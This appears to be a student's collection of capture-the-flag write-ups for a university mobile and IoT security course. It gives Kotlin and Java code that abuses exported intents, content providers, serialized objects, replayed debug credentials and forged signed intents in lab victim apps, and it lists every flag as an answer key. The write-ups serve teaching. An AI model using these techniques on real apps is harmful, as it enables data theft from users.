# Mobile and IOT Security Challenges
Challenges of Mobile &amp; IOT Security Course ; Master's Degree in Computer Science @ UniPd

- [Mobile and IOT Security Challenges](#mobile-and-iot-security-challenges)
  - [Challenges progress](#challenges-progress)
- [Writeups](#writeups)
  - [1 Filehasher](#1-filehasher)
    - [Flag](#flag)
  - [2 Just Ask](#2-just-ask)
    - [Flag](#flag-1)
  - [3 Serial intent](#3-serial-intent)
    - [Flag](#flag-2)
  - [4 Where are you](#4-where-are-you)
    - [Flag](#flag-3)
  - [5 Just listen](#5-just-listen)
    - [Flag](#flag-4)
  - [6 Joke provider](#6-joke-provider)
    - [Flag](#flag-5)
  - [7 Reaching out](#7-reaching-out)
    - [Flag](#flag-6)
  - [8 Baby rev](#8-baby-rev)
    - [Flag](#flag-7)
  - [9 Pin code](#9-pin-code)
    - [Flag](#flag-8)
  - [10 gnirts](#10-gnirts)
    - [Flag](#flag-9)
  - [11 Going native](#11-going-native)
    - [Flag](#flag-10)
  - [12 Going serious native](#12-going-serious-native)
    - [Flag](#flag-11)
  - [13 Load me](#13-load-me)
    - [Flag](#flag-12)
  - [14 frontdoor](#14-frontdoor)
    - [cratfing dedicated apk](#cratfing-dedicated-apk)
    - [Flag](#flag-13)
  - [15 No jump starts](#15-no-jump-starts)
    - [Flag](#flag-14)
  - [Exam example](#exam-example)
    - [MyProvider](#myprovider)
    - [code to use the db provider](#code-to-use-the-db-provider)
    - [getting & converting b64](#getting--converting-b64)
    - [Flag](#flag-15)

## Challenges progress
- [x] 1) Filehasher
- [x] 2) Justask
- [x] 3) serial intent
- [x] 4) where are you
- [x] 5) just listen
- [x] 6) joke provider
- [x] 7) Reaching out
- [x] 8) babyrev
- [x] 9) pincode
- [x] 10) gnirts
- [x] 11) goingnative
- [x] 12) goingseriousnative
- [x] 13) loadme
- [x] 14) frontdoor
- [x] 15) nojumpstarts

---

# Writeups

## 1 Filehasher
- define custom activity to listen on requried intent
  ```xml
  <activity
    android:name=".HashingActivity"
    android:exported="true"
    android:label="@string/title_activity_hashing"
    android:theme="@style/Theme.BetterFileHasher.NoActionBar" >
    <intent-filter>
      <action android:name="com.mobiotsec.intent.action.HASHFILE" />
      <category android:name="android.intent.category.DEFAULT" />
      <data android:mimeType="text/plain"/>
    </intent-filter>
  </activity>
  ```
- we need to read the file at the received path, and make a sha256sum
- define the calc hash fun to do the dirty job:
  ```kotlin
  private fun calcHash(s: String): String? {
      var r = byteArrayOf()
      try {
          val md: MessageDigest = MessageDigest.getInstance("SHA-256")
          r = md.digest(s.toByteArray())
      } catch (e: NoSuchAlgorithmException) {
          e.printStackTrace()
          Toast.makeText(this, "COULDN'T COMPUTE HASH $e", Toast.LENGTH_LONG).show()
      }
      val hashBuilder = StringBuilder()
      for (b in r) {
          val hex = Integer.toHexString(b.toInt())
          if (hex.length == 1) {
              hashBuilder.append("0")
              hashBuilder.append(hex[0])
          } else {
              hashBuilder.append(hex.substring(hex.length - 2))
          }
      }
      return hashBuilder.toString()
  }
  ```

- process the input, construct the intent answer and send it back
  ```kotlin
  lateinit var baseString: String
  val `in`: BufferedReader
  try {
      `in` = BufferedReader(
          InputStreamReader(
              FileInputStream(
                  intent.data.toString().replace("file:/", "")
              )
          )
      )
      baseString = `in`.readLine()
  } catch (e: Exception) {
      Toast.makeText(this, "STH BROKE$e", Toast.LENGTH_LONG).show()
  }

  val hash = calcHash(baseString)
  Toast.makeText(this, "answer: $hash", Toast.LENGTH_SHORT).show()

  // return the hash in a "result" intent

  // return the hash in a "result" intent
  val resultIntent = Intent()
  log("hash: $hash")
  resultIntent.putExtra("hash", hash)
  setResult(RESULT_OK, resultIntent)
  finish()
  ```
### Flag
> `FLAG{piger_ipse_sibi_obstat}`

---

## 2 Just Ask
- follow several intents
  - some are available through intent filters, other are just exported, so act differently
- given the manifest with the following activities:
  ```xml
  <activity android:name=".PartOne" android:exported="true"/>
  <activity android:name=".PartTwo">
      <intent-filter>
          <action android:name="com.example.victimapp.intent.action.JUSTASK"/>
          <category android:name="android.intent.category.DEFAULT"/>
      </intent-filter>
  </activity>
  <activity android:name=".PartThree" android:exported="true"/>
  <activity android:name=".PartFour">
      <intent-filter>
          <action android:name="com.example.victimapp.intent.action.JUSTASKBUTNOTSOSIMPLE"/>
          <category android:name="android.intent.category.DEFAULT"/>
      </intent-filter>
  ```
  we can build strings and intents accordingly:
  ```kotlin
  private var part1 = Intent()
  private lateinit var part2: Intent
  private var part3 = Intent()
  private lateinit var part4: Intent
  // [...]
  //setup intent strings
  val victimPacakge = "com.example.victimapp"
  val part1_str = "$victimPacakge.PartOne"
  val part2_str = "$victimPacakge.intent.action.JUSTASK"
  val part3_str = "$victimPacakge.PartThree"
  val part4_str = "$victimPacakge.intent.action.JUSTASKBUTNOTSOSIMPLE"

  // setup intent objects
  part1.component = ComponentName(victimPacakge, part1_str)
  part2 = Intent(part2_str)
  part3.component = ComponentName(victimPacakge, part3_str)
  part4 = Intent(part4_str)
  ```
  and then construct handler for each intent to chain them
  ```kotlin
  // ad hoc handler for part 1
  private val askFlag =
    registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result: ActivityResult ->
      val intent = result.data
      val str = intent!!.getStringExtra("flag").toString()
      Log.println(Log.INFO, TAG, str)
      finalFlag += str
      askFlag2.launch(part2)
    }

  // ad hoc handler for part 2
  private val askFlag2 =
    registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result: ActivityResult ->
      val intent = result.data
      val str = intent!!.getStringExtra("flag").toString()
      Log.println(Log.INFO, TAG, str)
      finalFlag += str
      askHiddenFlag.launch(part3)
    }


  // ad hoc handler for part 3
  private val askHiddenFlag =
    registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result: ActivityResult ->
      val intent = result.data
      val str = intent!!.getStringExtra("hiddenFlag").toString()
      Log.println(Log.INFO, TAG, intent.getStringExtra("flag").toString())
      Log.println(Log.INFO, TAG, str)

      finalFlag += str
      notSoSimple.launch(part4)
    }

  // ad hoc handler for part 4
  val notSoSimple =
    registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
      val intent = result.data
      val follow: Bundle = intent!!.extras!!.get("follow") as Bundle

      val theValue: Bundle = follow.get("the value") as Bundle
      val rabbit: Bundle = theValue.get("rabbit") as Bundle
      val hole: Bundle = rabbit.get("hole") as Bundle
      val deeper: Bundle = hole.get("deeper") as Bundle

      val str = deeper.get("never ending story").toString()
      Log.i(TAG, str)
      finalFlag += str

      Log.i(TAG, "\n\tTHE COMPLETE FLAG IS: $finalFlag")

      findViewById<TextView>(R.id.flag_result).text = finalFlag
    }
  ```

  since from the first on they are called from the previous, we just need to start manually the first: `askFlag.launch(part1)`

### Flag
> `FLAG{Gutta_cavat_lapidem_non_vi_sed_saepe_cadendo}`

---

## 3 Serial intent
- the app has an exported SerialActivity whose code we have
- we see this uses another class, FlagContainer which we have as well
- it uses that to serialize the flag, we can reproduce and invert the behaviour
- to make the deserialization process work, we need to match the exact package name for the FlagContainer, so we reproduce folder structure to implement the FlagContainer class (also because the getFlag method is private and we need reflections to call it)
  ```kotlin
  package com.example.victimapp; //!!! notice this

  public class FlagContainer implements Serializable {
      private String[] parts;
      private ArrayList<Integer> perm;

      public FlagContainer(String[] parts, ArrayList<Integer> perm) {
          this.parts = parts;
          this.perm = perm;
      }

      private String getFlag() {
          int n = parts.length;
          int i;
          String b64 = new String();
          for (i=0; i<n; i++) {
              b64 += parts[perm.get(i)];
          }

          byte[] flagBytes = Base64.decode(b64, Base64.DEFAULT);
          String flag = new String(flagBytes, Charset.defaultCharset());

          return flag;
      }
  }
  ```

- so we can use this to create our intent exploiter:
  ```kotlin
  val intentInspector=registerForActivityResult(ActivityResultContracts.StartActivityForResult()){res ->
        val intent=res.data
        val f: FlagContainer = intent.getSerializableExtra("flag")  as FlagContainer
        val m: Method=f.javaClass.getDeclaredMethod("getFlag")
        m.isAccessible=true
        val flag=m.invoke(f);
        val flagString=flag!!.toString()
        log("THE FLAG IS: $flagString")
        findViewById<TextView>(R.id.flag_result).text=flagString
    }
  ```
- then we just need to launch the intent with correct package/intent
  ```kotlin
  intentInspector.launch(
    Intent().setComponent(
        ComponentName("com.example.victimapp", "$victimPacakge.SerialActivity")
      )
    )
  ```

### Flag
> `FLAG{memento_audere_semper}`

---

## 4 Where are you
- for this we need to add 2 location permissions:
  ```xml
  <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
  <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
  ```
- then we need to add & declare a service with the required intent, it'll be called from victim app
  ```xml
  <service
    android:name=".MyLocationService"
    android:exported="true"
    tools:ignore="ExportedService">
    <intent-filter>
      <action android:name="com.mobiotsec.intent.action.GIMMELOCATION" />
    </intent-filter>
  </service>
  ```
  so `MyLocationService.kt`, added where also MainActivity lies, will do the main job
- in this service, we have some constats, a location manager and its inizializer plus some specific listeners
  ```kotlin
  companion object {
        const val INTERVAL = 1000L
        const val DISTANCE = 10f
    }

  private lateinit var locationManager: LocationManager

  private val listener = arrayOf(
      LocationListener(LocationManager.GPS_PROVIDER),
      LocationListener(LocationManager.NETWORK_PROVIDER)
  )

  private fun initLocationManager() {
      log("init loc manager")
      locationManager =
          applicationContext.getSystemService(Context.LOCATION_SERVICE) as LocationManager
  }
  ```

- then an inner class being the location listener which will act onLocationChanged
  ```kotlin
  private inner class LocationListener(provider: String) : android.location.LocationListener {
      private var lastLocation: Location;

      init {
          log(provider)
          lastLocation = Location(provider)
      }

      override fun onLocationChanged(location: Location) {
          log("On location changed ${location.toString()}")
          Intent().also { intent ->
              intent.action = "com.mobiotsec.intent.action.LOCATION_ANNOUNCEMENT"
              intent.putExtra("location", location)
              sendBroadcast(intent)
          }
      }

      @Deprecated("...")
      override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {
          //just do nothing
      }

  }
  ```
- onCreate we initialize the loc manager and request location update
  ```kotlin
  override fun onCreate() {
      initLocationManager()
      try {
          locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, INTERVAL, DISTANCE, listener[0])
      } catch (ex: SecurityException) {
          log("fail to request location update, ignore $ex")
      } catch (ex: Exception) {
          log("exception: ${ex.message}")
      }
  }
  ```

- finally, onStart, onBind and onDestroy are just there doing nothing, aside from the return in onStart
  ```kotlin
  override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
      log("Started SERVICE ${intent.toString()}")
      Toast.makeText(this, "started service", Toast.LENGTH_LONG).show()

      return START_STICKY
  }

  override fun onBind(intent: Intent): IBinder? {
      // We don't provide binding, so return null
      return null
  }

  override fun onDestroy() {
      Toast.makeText(this, "service done", Toast.LENGTH_SHORT).show()
  }
  ```

### Flag
> `FLAG{piger_ipse_sibi_obstat}`

---

## 5 Just listen
- we're told there's a broadcast intent "victim.app.FLAG_ANNOUNCEMENT"
- we add a custom receiver & declare it in the manifest just below the activity tag of the main activity
  ```xml
  <receiver android:name=".MyReceiver" />
  ```
- this receiver just need to print what it gets, once we explored it a little bit
  ```kotlin
  class MyReceiver : BroadcastReceiver() {
    override fun onReceive(p0: Context?, res: Intent?) {
        res!!.extras!!.keySet().forEach { k ->
            log("$k: ${res.getStringExtra(k)}")
        } // just to see what's in there
        val flag = res.getStringExtra("flag") //as simple as that
        MainActivity.act.findViewById<TextView>(R.id.flag).text = flag
    }
  }
  ```
  - MainActivity.act is a dirty trick used to let it access the context to set the field on the view easily, definetely not needed
    ```kotlin
    // in MainActivity
    companion object {
        lateinit var act: MainActivity
    }
    ```
- finally to make it work we need to register the specified intent string on our custom receiver
  ```kotlin
  MyReceiver.log("main")
  val filter = IntentFilter()
  filter.addAction("victim.app.FLAG_ANNOUNCEMENT")
  val receiver = MyReceiver()
  registerReceiver(receiver, filter)
  act = this
  ```

### Flag
> `FLAG{carpe_diem}`

---

## 6 Joke provider
- we use a content provider, we need a permission: `<uses-permission android:name="READ_USER_DICTIONARY" />`
- we have some insights:
  - provider in victim manifest:
    ```xml
    <provider
          android:name=".MyProvider"
          android:authorities="com.example.victimapp.MyProvider"
          android:enabled="true"
          android:exported="true">
      </provider>
    ```
  - table structure:
    ```java
    String CREATE_TABLE =
        " CREATE TABLE joke" +
                " (id INTEGER PRIMARY KEY AUTOINCREMENT, " +
                " author TEXT NOT NULL, " +
                " joke TEXT NOT NULL);";
    ```
  - a brief piece of usage:
    ```java
    static final String PROVIDER_NAME = "com.example.victimapp.MyProvider";
    static final String TABLE_NAME = "joke";
    static final String URL = "content://" + PROVIDER_NAME + "/" + TABLE_NAME;
    static final int uriCode = 1;

    static final UriMatcher uriMatcher;
        static{
            uriMatcher = new UriMatcher(UriMatcher.NO_MATCH);
            uriMatcher.addURI(PROVIDER_NAME, TABLE_NAME, uriCode);
        }
    ```
- we have some useful constants discovered on the way:
  ```kotlin
  companion object {
      const val PROVIDER_NAME = "com.example.victimapp.MyProvider"
      const val TABLE_NAME = "joke"
      const val URL = "content://$PROVIDER_NAME/$TABLE_NAME"
      const val REQUIRED_AUTHOR = "elosiouk"
  }
  ```
- onCreate, we query the provider with a custom function, `queryContentProvider()`, which does the complex job:
  ```kotlin
  fun queryContentProvider() {
      try {
          val cursor = contentResolver.query(
              URL.toUri(),
              arrayOf("*"),
              "",
              null,
              null,
          )
          log("found ${cursor!!.count}")
          cursor.moveToFirst()
          var flag = ""

          while (!cursor.isLast) {
              val id = cursor.getString(cursor.getColumnIndexOrThrow("id"))
              val author = cursor.getString(cursor.getColumnIndexOrThrow("author"))
              val joke = cursor.getString(cursor.getColumnIndexOrThrow("joke"))
              log("Processing row $id...")
              if (author.equals(REQUIRED_AUTHOR)) {
                  flag += joke
                  log("\tfound author match!")
              }
              cursor.moveToNext()
          }

          cursor.close()

          log("***")
          log(flag)
          Toast.makeText(this, "The flag is: $flag", Toast.LENGTH_LONG).show()
          findViewById<TextView>(R.id.flag).text = flag
      } catch (e: Exception) {
          log("err: ${e.stackTraceToString()}")
      }
  }
  ```
  the querying mechanism is sql-like, you just need to experiment with the results and see what you got there

### Flag
> `FLAG{Homo_faber_fortunae_suae}`

---

## 7 Reaching out
- there's a web server running, funny
- we need a rest library, https://square.github.io/retrofit/ this is good
- once understood the library, we define a FlagApi which expose a service as an interface with the needed rest methods:
  ```kotlin
  private const val BASE_URL="http://10.93.0.170:8085" //localhost didn't work...

  private val retrofit= Retrofit.Builder()
      .addConverterFactory(ScalarsConverterFactory.create())
      .baseUrl(BASE_URL)
      .build()


  interface FlagService{
      @GET("/")
      fun getRoot(): Call<String>

      @GET("/flag.html")
      fun getFlag(): Call<String>

      @FormUrlEncoded
      @POST("/check_math.php")
      fun doTheMath(@Field("answer") ans: String): Call<String>
  }

  object FlagAPi{
      val retrofitService: FlagService by lazy{
          retrofit.create(FlagService::class.java)
      }
  }
  ```
- once understood what our server wants, we can exploit the logic with our super cool POST:
  ```kotlin
  FlagAPi.retrofitService.doTheMath("4").enqueue(
      object:Callback<String>{
          override fun onResponse(call: Call<String>, response: Response<String>) {
              flag.text=response.body()
              log(response.body()!!)
          }

          override fun onFailure(call: Call<String>, t: Throwable) {
              flag.text="Failed to fetch: ${t.message}"
              log(t.message!!)
          }
      }
  )
  ```

### Flag
> `FLAG{non_nobis_solum_nati_sumus}`

---

## 8 Baby rev
- `jadx -d out babyrev.apk`
- analyze `FlagChecker.java` code
- understand logic to check flag
    - starts with `FLAG{scientia`
    - it is 27 chars long
    - end with `est}`
    - several useless checks
    - 12th char is an 'a'
    - 13th & 22th chars are '_'
    - 12th==21th -> 'a'
    - substring [14,22) is passed to bam function which output is compared to "cBgRaGvN", to get the latter, we need to pass to the bam function the string "pOtEnTiA"
    - finally the slice between '{}' of the flag is checked against a regex, to match it must have upper and lower case chars alternated

### Flag
> `FLAG{ScIeNtIa_pOtEnTiA_EsT}`

---

## 9 Pin code
- decompile with jadx
- understand that input pin is 6 digit long and hashed via md5 multiple times to be later checked against "d04988522ddfed3133cc24fb6924eae9", we can brute force it
- correct pin is 703958

### Flag
> `FLAG{in_vino_veritas}`

---

## 10 gnirts
- `jadx -d out gnirts.apk`
- flag has usual format FLAG{...}
- its core is 26 chars long
- it's composed of four chunks separated by '-' each one respecting a regex and the entire part respecting another one
    - so the template is sth like: FLAG{aaaa-bbbbb-CCCCC-99aAz9999}
    - since lowercase letters get replaced by 'x', uppercase by 'X' and numbers by ' '
- then we understand the positions of the three hyphens -> {8, 15, 21}  //FLAG{aaa-abbbbb-CCCCC-99aAz9999}
- the next check computes MD5 of each chunk and compares it with an hardcoded string, we can brute force it knowing the length of the starting string and the chars range:
    1. looking for: 3 lower case chars, md5: `82f5c1c9be89c68344d5c6bcf404c804`
        ```java
        for(char a='a';a<='z';++a)
            for(char b='a';b<='z';++b)
                for(char c='a';c<='z';++c){
                    String s=""+a+b+c;
                    String md=dh("MD5", s);
                    if(md.equals(md1)){
                        System.out.println("Found: "+s);
                        a=b=c='z';
                    }
        }
        ```

        ```ruby
        lower.to_a.permutation(3).each do |s|
            s=s.join
            ->{puts "found: #{s}" ; break}.[] if Digest::MD5.new.update(s).hexdigest=="82f5c1c9be89c68344d5c6bcf404c804"
        end
        ```

        result: `sic`
    2. chunk 2, lookgin for 6 chars/numbers, md5: `e86d706732c0578713b5a2eed1e6fb81`
        ```ruby
        ('0'..'z').to_a.repeated_permutation(6).each do |s|
            s=s.join
            ->{puts "found: #{s}" ; break}.[] if Digest::MD5.new.update(s).hexdigest=="e86d706732c0578713b5a2eed1e6fb81"
        end
        ```

        result: `parvis`

    3. looking for: 5 upper case chars, md5: `7ff1301675eb857f345614f9d9e47c89`
        ```ruby
        upper.each{|a| upper.each{|b| upper.each{|c| upper.each{|d| upper.each do |e|
            s=a+b+c+d+e
            puts "found: #{s}" if Digest::MD5.new.update(s).hexdigest==md3
            end
        }}}}
        ```

        ```ruby
        upper.to_a.repeated_permutation(5).each do |s|
            s=s.join
            if Digest::MD5.new.update(s).hexdigest==md3
                puts "found: #{s}" 
                break
            end
        end;nil
        ```

        result: `MAGNA`

    4. looking for 99aAz9999, md5: `b446830c23bf4d49d64a5c753b35df9a`
        ```ruby
        lo=('a'..'z').to_a
        hi=('A'..'Z').to_a
        nu=(0..9).to_a

        nu.repeated_permutation(2).each do |n1|
            lo.each do |l1|
                upper.each do |u|
                    lo.each do |l2|
                        nu.repeated_permutation(4).each do |n2|
                            s=[l1, u, l2, n2].join
                            puts "found: #{s}" if Digest::MD5.new.update(s).hexdigest == md4
                        end
                    end
                end
            end
        end
        ```

        result: `28jAn1596`

### Flag
> `FLAG{sic-parvis-MAGNA-28jAn1596}`

---

## 11 Going native
- decompile with jadx
- in MainActivity splitFlag provides some insights on the flag: 
    - starts with FLAG{ ends with } with 15 chars in between
notice a native library is imported
the splitFlag methods uses a call to that library to check the flag
open the native lib `resources/lib/x86_64/libgoingnative.so`  with IDA allows us to understand a lot
we notice a `Java_com_mobiotsec_goingnative_MainActivity_checkFlag` function
inspecting it we see that at some point it either says "correct" or "invalid" flag upon calling validate_input
inspecting the latter we notice a repeating pattern with multiple checks on different strings, so we understands the central part of the flags is built by 3 chunks: "status", "1234" and "quo"
trying in the app with '_' as delimiter works and confirms our intuition

### Flag
> `FLAG{status_1234_quo}`

---

## 12 Going serious native
- decompile jadx and open libgoingseriousnative with ida
- in MainActivity there's a flag
- in validate in the lib there's a logic to check some pin but it is confused...

### Flag
> `FLAG{omnia_prius_experiri_quam_armis_sapientem_decet}`
- ??? PIN: `5594570` <- found in strings libgoingseriousnative...
    - probably no, since the explanation/solution tells sth about a 5 digits that sum up to 100...

---

## 13 Load me
- MainActivity reads input flag and creates new instance of DoStuff classs, passing the conext & flag to the start method
- sets some kind of strict mode
- lot of tricky work
  - there are some strings encrypted and encoded in base64
    - we can reverse the process reimplementing the dedicated `ds` function using the java lib for base64
    - the key is based on the package name (com.mobiotsec.loadme)
      - then we can call it on all the inputs available to get more insights
        >   - https://www.math.unipd.it/~elosiouk/test.dex
        >    - com.mobiotsec.loadimage.LoadImage
        > - load
        > - test.dex
- we understands there are some http calls which allow to dinamically load the donwloaded file at the url
- basically we would discover that the logo.png in the assets it's actually a dex file
- but jadx already did the job before us, discovering it and decompiling it
- in fact we have a `Check.java` file which contains the flag in plain text

### Flag
> `FLAG{memores_acti_prudentes_futuri}`

---

## 14 frontdoor
- open app, see there are some input fields for a pair user&pwd
- it interacts with a server
- decompile the app with jadx
- we see that it sends a get request to root at http://10.0.2.2:8085
- if not in debug mode, it sends the request with the strings inserted by user
- otherwise we see a prefilled pair user&pwd
  - `username=testuser&password=passtestuser123`
- just trying to send that request with those parameters we're able to retrieve the flag

### cratfing dedicated apk
- in gradle app (the one with the dependencies block) add into `dependencies{...}` these 2 lines
    ```gradle
    implementation "com.squareup.retrofit2:retrofit:2.9.0"
    implementation "com.squareup.retrofit2:converter-scalars:2.9.0"
    ```
- add the internet permission to the manifest before the application tag
    ```xml
    <uses-permission android:name="android.permission.INTERNET"/>
    ```
- create a `FlagApiService.kt` file where `MainActivity` lies
- common structure for this:
  - define a base url
  - construct a retrofit val from the lib builder & factory
  - define an interface where you describe the endpoints
  - define an object which will lazily build a retrofit service based on the previously defined interface
  ```kotlin

    import retrofit2.Call
    import retrofit2.Retrofit
    import retrofit2.converter.scalars.ScalarsConverterFactory
    import retrofit2.http.GET


    private const val BASE_URL="http://10.0.2.2:8085"

    private val retrofit=Retrofit.Builder()
        .addConverterFactory(ScalarsConverterFactory.create())
        .baseUrl(BASE_URL)
        .build()

    interface FlagService{
        @GET("/")
        fun getRoot(): Call<String>

        @GET("/")
        fun login(@Query("username") user: String, @Query("password") pwd: String): Call<String>

        //same as above, but moves the responsiblitiy of setting param name to caller
        @GET("/")
        fun loginWithMappedParams(@QueryMap options: Map<String, String>): Call<String>
    }

    object FlagApi{
        val retrofitService: FlagService by lazy{
            retrofit.create(FlagService::class.java)
        }
    }
  ```
- use the api interface to communicate with the server
  ```kotlin
    FlagApi.retrofitService.login("testuser","passtestuser123").enqueue(
            object: Callback<String>{
                override fun onResponse(call: Call<String>, response: Response<String>) {
                    flagDisplay.text="${response.body()}"
                    log("found result ${response.body()}")
                }

                override fun onFailure(call: Call<String>, t: Throwable) {
                    log("sth went wrong. call: $call, err: $t")
                    flagDisplay.text="error"
                }

            }
        )
  ```
  - alternative way with mapped parameters:
  ```kotlin
    // alternative way to use query params
    FlagApi.retrofitService.loginWithMappedParams(
        mapOf(
            "username" to "testuser",
            "password" to "passtestuser123"
        )
    ).enqueue(
        object : Callback<String> {
            override fun onResponse(call: Call<String>, response: Response<String>) {
                flagDisplay.text = "${response.body()}"
                log("found result ${response.body()}")
            }

            override fun onFailure(call: Call<String>, t: Throwable) {
                log("sth went wrong. call: $call, err: $t")
                flagDisplay.text = "error"
            }

        }
    )
  ```

### Flag
> `FLAG{forma_bonum_fragile_est}`

---

## 15 No jump starts
- at first sight app does not do a lot...
- decompile with jadx
- notice an intent `mobiotsec.intent.getflag` in the manifest
  - inspect it in out custom app
  ```kotlin
    private val inspectIntent =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result: ActivityResult ->
            val intent=result.data
            intent!!.extras!!.keySet().forEach{k->
                log("$k => ${intent.getStringExtra(k)}")
            }
        }
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        val intent = Intent("mobiotsec.intent.getflag")
        inspectIntent.launch(intent)
    }
  ```
  - got this: 
    > `flag => C: broken auth`
- noticing a pattern to pass between activities and build msg and auths
- copy that logic in our app and use it to create custom msg and sign for intent C
  - in particular:
  ```kotlin
    @Throws(Exception::class)
    fun buildIntent(src: String, dst: String, chain: String?): Intent? {
        //figured out this inspecting original app code
        val msg="Main-to-A/A-to-B/B-to-C"
        val sign: ByteArray? = sign(msg) //imported as well
        val i = Intent()
        //first parameter must be forced to that unlike in original app which takes is programmatically, this would lead to wrong package name here
        i.component = ComponentName("com.mobiotsec.nojumpstarts", "com.mobiotsec.nojumpstarts.$dst")
        i.putExtra("authmsg", msg)
        i.putExtra("authsign", sign)
        return i
    }
  ```
- so we can build the custom intent with the embedded msg and sign now:
```kotlin
val testC=buildIntent("Main", "C", null)
inspectIntent.launch(testC)
```


### Flag
> `FLAG{virtus_unita_fortior}`

---

## Exam example
- inspecting hte gimme the flag intent we get `FLAGer{2RvbmVfeW91X2hhdmVfcGFzc2VkX3RoZV9leGFtIX0=`
- we notice some kind of provider
- not a basic one, copy logic of Dbhelper and exploit it to analyze content
- we use it and found 69 records, one with author mobiotsec_exam
- sending that as firstFlagPart to the gimmetheflag intent returns us a string, whichd decoded b64 gets us the flag

### MyProvider
```kotlin
package com.example.maliciousapp

/* loaded from: classes.dex */
class MyProvider : ContentProvider() {
    private var db: SQLiteDatabase? = null

    companion object {
        const val COLUMN_AUTHOR = "author"
        const val COLUMN_JOKE = "joke"
        const val DATABASE_NAME = "JokeDB"
        private const val DATABASE_VERSION = 1
        const val PROVIDER_NAME = "com.example.victimapp.MyProvider"
        const val TABLE_NAME = "joke"
        const val uriCode = 1
        var uriMatcher: UriMatcher? = null
        const val URL = "content://com.example.victimapp.MyProvider/joke"
        val CONTENT_URI = Uri.parse(URL)

        init {
            val uriMatcher2 = UriMatcher(-1)
            uriMatcher = uriMatcher2
            uriMatcher2.addURI(PROVIDER_NAME, "joke", 1)
        }
    }

    // android.content.ContentProvider
    override fun onCreate(): Boolean {
        val context = context
        val dbHelper = DatabaseHelper(context)
        val writableDatabase = dbHelper.writableDatabase
        db = writableDatabase
        return if (writableDatabase != null) {
            true
        } else false
    }

    // android.content.ContentProvider
    override fun query(
        uri: Uri,
        projection: Array<String>?,
        selection: String?,
        selectionArgs: Array<String>?,
        sortOrder: String?
    ): Cursor? {
        val qb = SQLiteQueryBuilder()
        qb.tables = "joke"
        val c = qb.query(db, projection, selection, selectionArgs, null, null, sortOrder)
        c.setNotificationUri(context!!.contentResolver, uri)
        return c
    }

    // android.content.ContentProvider
    override fun getType(uri: Uri): String? {
        return null
    }

    // android.content.ContentProvider
    override fun insert(uri: Uri, values: ContentValues?): Uri? {
        throw SQLiteException("Failed to add a record into $uri")
    }

    // android.content.ContentProvider
    override fun delete(uri: Uri, s: String?, strings: Array<String>?): Int {
        return 0
    }

    // android.content.ContentProvider
    override fun update(
        uri: Uri,
        contentValues: ContentValues?,
        s: String?,
        strings: Array<String>?
    ): Int {
        return 0
    }

    /* loaded from: classes.dex */
    public class DatabaseHelper internal constructor(context: Context?) :
        SQLiteOpenHelper(context, DATABASE_NAME, null as CursorFactory?, 1) {
        // android.database.sqlite.SQLiteOpenHelper
        override fun onCreate(db: SQLiteDatabase) {
            db.execSQL(" CREATE TABLE joke (id INTEGER PRIMARY KEY AUTOINCREMENT,  author TEXT NOT NULL,  joke TEXT NOT NULL);")
            //...create records data...
        }

        // android.database.sqlite.SQLiteOpenHelper
        override fun onUpgrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) {
            db.execSQL("DROP TABLE IF EXISTS joke")
            onCreate(db)
        }
    }
}
```

### code to use the db provider
```kotlin
val dbHelper=MyProvider.DatabaseHelper(this)
val db=dbHelper.readableDatabase

val cursor = db.query(
    TABLE_NAME,
    arrayOf("*"),
    "",
    null,
    null,
    null,
    null
)
log("found ${cursor!!.count}")
cursor.moveToFirst()
var jokeToKeep=""
while (!cursor.isLast) {
    val id = cursor.getString(cursor.getColumnIndexOrThrow("id"))
    val author = cursor.getString(cursor.getColumnIndexOrThrow("author"))
    val joke = cursor.getString(cursor.getColumnIndexOrThrow("joke"))
    if(author=="mobiotsec_exam"){
        jokeToKeep=joke
    }
    log("Processing row $id, $author, $joke")
    cursor.moveToNext()
}

val intent= Intent("com.mobiotsec.exam.intent.action.GIMMETHEFLAG")
intent.putExtra("firstFlagPart", jokeToKeep)
intentInspector.launch(intent)
```
### getting & converting b64
```kotlin
val b64=intent.getStringExtra("flag")
val flagBytes=Base64.decode(b64, Base64.DEFAULT);
log(String(flagBytes, Charset.defaultCharset()))
```

### Flag
> `FLAG{well_done_you_have_passed_the_exam!}`